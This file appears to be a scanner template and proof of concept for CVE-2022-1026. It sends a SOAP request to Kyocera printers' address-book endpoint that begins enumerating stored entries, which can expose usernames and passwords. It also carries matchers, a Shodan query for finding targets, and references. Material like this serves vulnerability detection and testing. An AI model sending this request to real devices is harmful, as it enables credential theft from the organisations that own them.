cves/2022/CVE-2022-1026.poc

## id: CVE-2022-1026
## name: Kyocera Net View Address Book Exposure
## author: hack007x
## severity: high
## cve: CVE-2022-1026
## tags: cve,cve2022,kyocera,exposure,vkev,vuln
## description: Kyocera multifunction printers running vulnerable versions of Net View unintentionally expose sensitive user information, including usernames and passwords, through an insufficiently protected address book export function.
## affects: Apply firmware updates provided by Kyocera or configure authentication for the address book export function.
## cvss-score: 8.6
## reference: https://github.com/ac3lives/kyocera-cve-2022-1026
## reference: https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/
## shodan-query: product:"Kyocera Printer Panel"
## verification: true

POST /ws/km-wsdl/setting/address_book HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Content-Type: application/soap+xml

<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>

#@ condition: and
#@ matcher: body contains "SOAP-ENV:Envelope"
#@ matcher: body contains "SOAP-ENV:Body"
#@ matcher: body contains "text/xml"
#@ matcher: status_code == 200





# @VEIL-STAMP: 2df52f344ce1be68f673ae14fc1bbecc6d1a1bb0851e109088e61c3ecce5f1ca
